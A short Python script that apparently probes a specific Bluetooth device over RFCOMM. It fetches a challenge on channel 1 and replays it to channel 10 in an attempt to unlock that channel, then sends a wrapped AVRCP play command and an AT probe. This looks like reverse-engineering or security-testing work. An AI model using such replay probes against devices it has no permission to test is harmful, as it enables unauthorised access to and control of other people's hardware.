import sys
import time

import bluetooth

TARGET = "F4:B6:2D:AE:AB:E0"

# Step 1: Get challenge from channel 1
print("[*] Connecting to RFCOMM channel 1...")
sock1 = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
sock1.connect((TARGET, 1))
print("[+] Connected to channel 1.")

# Request challenge using opcode 0x00
cmd = bytes([0x00, 0x00, 0x00, 0x00])
print(f"[>] Sending opcode 0x00: {cmd.hex()}")
sock1.send(cmd)
time.sleep(0.3)
resp = sock1.recv(256)
print(f"[<] Response: {resp.hex()} (len={len(resp)})")

if len(resp) >= 17:
    challenge = resp[1:17]  # Skip leading 0x01
    print(f"[*] Extracted challenge: {challenge.hex()}")
else:
    print("[!] Unexpected response length.")
    sock1.close()
    sys.exit(1)

sock1.close()

# Step 2: Send challenge to channel 10
print("\n[*] Connecting to RFCOMM channel 10...")
sock10 = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
sock10.connect((TARGET, 10))
print("[+] Connected to channel 10.")

print(f"[>] Sending challenge to channel 10: {challenge.hex()}")
sock10.send(challenge)
time.sleep(0.5)

# Step 3: Try to send a command (e.g., wrapped AVRCP PLAY) to see if channel is now unlocked
avrcp_play = bytes([0x00, 0x48, 0x7C, 0x44, 0x00])
wrapped = bytes([0xAA, 0x55, 0x00, 0x05]) + avrcp_play
print(f"[>] Sending wrapped AVRCP PLAY: {wrapped.hex()}")
sock10.send(wrapped)
time.sleep(0.5)

# Try other probes
print("[>] Sending AT command: AT\r\n")
sock10.send(b"AT\r\n")
time.sleep(0.5)

# Check for any response
try:
    sock10.settimeout(2.0)
    resp10 = sock10.recv(256)
    print(f"[<] Channel 10 responded: {resp10.hex()}")
except:
    print("[<] No response from channel 10.")

sock10.close()
print("[+] Done.")
